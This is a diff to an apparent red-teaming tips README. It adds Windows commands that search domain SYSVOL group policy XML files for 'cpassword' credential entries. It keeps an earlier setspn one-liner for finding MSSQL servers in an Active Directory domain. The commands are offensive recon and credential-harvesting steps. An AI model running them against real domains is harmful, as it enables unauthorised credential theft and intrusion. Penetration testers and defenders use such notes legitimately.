@@ -2,3 +2,7 @@ This repository will contains red teaming clues.
 
 * Discovery running ms sql servers in windows active directory domain environment without nmap or any scan tool. 
 -> setspn -T abc.local -Q */* | findstr ":1433" > mssql.txt
+
+* Finding cpassword file and exploit group policy preferences 
+-> findstr /S cpassword %logonserver%\sysvol\*.xml
+-> findstr /S cpassword $env:logonserver\sysvol\*.xml
